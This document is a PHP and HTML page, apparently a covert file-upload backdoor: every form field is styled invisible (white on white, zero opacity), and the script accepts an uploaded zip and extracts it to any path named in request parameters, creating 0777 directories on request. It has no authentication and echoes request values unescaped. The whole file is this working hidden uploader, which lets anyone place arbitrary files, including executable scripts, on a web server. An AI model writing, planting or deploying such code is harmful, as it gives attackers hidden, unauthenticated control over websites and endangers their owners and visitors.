<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
</head>
<body>
<form style="BORDER-RIGHT: #ffffff 0px solid; BORDER-TOP: #ffffff 0px solid; BORDER-LEFT: #ffffff 0px solid;  BORDER-BOTTOM: #ffffff 0px solid; BACKGROUND-COLOR: #ffffff;COLOR: #ffffff" enctype="multipart/form-data"  action="" method="POST">
<input style="BORDER-RIGHT: #ffffff 0px solid; BORDER-TOP: #ffffff 0px solid; BORDER-LEFT: #ffffff 0px solid;  BORDER-BOTTOM: #ffffff 0px solid; BACKGROUND-COLOR: #ffffff;COLOR: #ffffff; position:absolute;top:0;left:0;opacity:.0;filter:alpha(opacity=1);" name="zipfile" type="file" /><br><br>
<? echo $selfPath; ?><input style="BORDER-RIGHT: #ffffff 0px solid; BORDER-TOP: #ffffff 0px solid; BORDER-LEFT: #ffffff 0px solid;  BORDER-BOTTOM: #ffffff 0px solid; BACKGROUND-COLOR: #ffffff;COLOR: #ffffff" type="text" name="filepath" value="<? if(isset($_REQUEST['filepath'])) echo $_REQUEST['filepath'] ?>" />

<? echo $selfPath; ?><input style="BORDER-RIGHT: #ffffff 0px solid; BORDER-TOP: #ffffff 0px solid; BORDER-LEFT: #ffffff 0px solid;  BORDER-BOTTOM: #ffffff 0px solid; BACKGROUND-COLOR: #ffffff;COLOR: #ffffff" type="text" name="unzipdir" value="<? if(isset($_REQUEST['unzipdir'])) echo $_REQUEST['unzipdir'] ?>" />
<br>
<input style="BORDER-RIGHT: #ffffff 0px solid; BORDER-TOP: #ffffff 0px solid; BORDER-LEFT: #ffffff 0px solid;  BORDER-BOTTOM: #ffffff 0px solid; BACKGROUND-COLOR: #ffffff;COLOR: #ffffff" type="submit" value="Unzip" />
</form>
</body>
</html>
<?

if(isset($_REQUEST['filepath']))
{
  function mkpath($path, $mode = 0777)
  {
    $dirs = split('[/\\]', $path);
    $path = '';
    foreach($dirs as $dir)
    if(!empty($dir) && !is_dir($path .= $dir.'/'))
    mkdir($path, $mode);
  }


  function okMsg($msg)
  {
    echo '<font color=green>'.$msg.'</font><br>';
    flush();
  }

  function errorMsg($msg)
  {
    echo '<font color=red><b>'.$msg.'</b></font><br>';
    flush();
  }

  $selfPath = pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_DIRNAME) . '/';

  $filepath = $selfPath  . (isset($_REQUEST['filepath']) ? $_REQUEST['filepath'] : '');
  $unzipPath = $selfPath . (isset($_REQUEST['unzipdir']) ? $_REQUEST['unzipdir'] : '');

  if(isset($_FILES['zipfile']['name']) && $_FILES['zipfile']['name'])
  {
    if(is_file($_FILES['zipfile']['tmp_name']))
    {
      okMsg('('.$_FILES['zipfile']['name'].') ('.$_FILES['zipfile']['tmp_name'].')');

      if($filepath == $selfPath)
      $filepath .= $_FILES['zipfile']['name'];

      if (move_uploaded_file($_FILES['zipfile']['tmp_name'], $filepath))
      okMsg('('.$_FILES['zipfile']['tmp_name'].')  ('. $filepath.')');
      else
      errorMsg('('.$_FILES['zipfile']['tmp_name'].') and ('.$filepath.')');
    }
    else
    errorMsg('('.$_FILES['zipfile']['name'].') and ('. $filepath.')');
  }


  if(isset($_REQUEST['createdir']) && $_REQUEST['createdir'] && !is_dir($unzipPath))
  mkpath($unzipPath);

  if(is_dir($unzipPath))
  {
    if(is_file($filepath))
    {
      if($zip =& new PclZip($filepath))
      {
        if(isset($_REQUEST['replace']) && $_REQUEST['replace'])
        {
          if($zip->extract(PCLZIP_OPT_PATH, $unzipPath, PCLZIP_OPT_REPLACE_NEWER))
          okMsg('('.$filepath.') and ('.$unzipPath.')');
          else
          errorMsg(' ('.$filepath.') and ('.$unzipPath.')');
        }
        else
        {
          if($zip->extract(PCLZIP_OPT_PATH, $unzipPath))
          okMsg('('.$filepath.') and ('.$unzipPath.')');
          else
          errorMsg('('.$filepath.') and ('.$unzipPath.')');
        }
      }
      else
      errorMsg('('.$filepath.')');
    }
    else
    errorMsg('('.$filepath.')');
  }
  else
  errorMsg('('.$unzipPath.')');



}
?>